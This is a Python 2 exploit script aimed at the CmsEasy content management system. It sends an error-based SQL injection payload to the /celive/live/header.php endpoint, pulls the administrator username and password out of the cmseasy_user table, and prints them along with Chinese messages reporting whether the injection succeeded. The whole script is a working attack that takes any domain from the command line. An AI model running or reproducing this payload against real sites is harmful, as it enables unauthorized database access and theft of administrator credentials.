#!/usr/bin/env python
# coding:utf-8
import urllib
import urllib2
import sys
import re


def test(domain):
    try:
        target = '%s/celive/live/header.php' % domain
        
        data= {
        'xajax':"LiveMessage",
        'xajaxargs[0][name]':"1',(SELECT 1 FROM "
        "(select count(*),concat(floor(rand(0)*2),"
        "(select concat(0x7e,username,0x23,password,0x7e) "
        "from cmseasy_user where groupid=2 limit 1))a "
        "from information_schema.tables group by a)b),"
        "'','','','1','127.0.0.1','2')#"
        }

        req = urllib2.Request(target, data=urllib.urlencode(data))

        response = urllib2.urlopen(req)

        s = "Duplicate entry \'(.*?)\' for "




        if response:
            hell = response.read()
            result = re.findall(s,hell)


            #print result
            print("%s 注入成功"%(domain))

            print "账号#密码 : %s" % result[0]

    except Exception:
        
        print("%s 注入失败"%(domain))




def main():
        arg = sys.argv
        url = ''
        if len(arg) == 2:
                url = arg[1]
                test(url)
        else:
                print "Usage: python %s domain" % (arg[0]) 
if __name__ == '__main__':
        main()
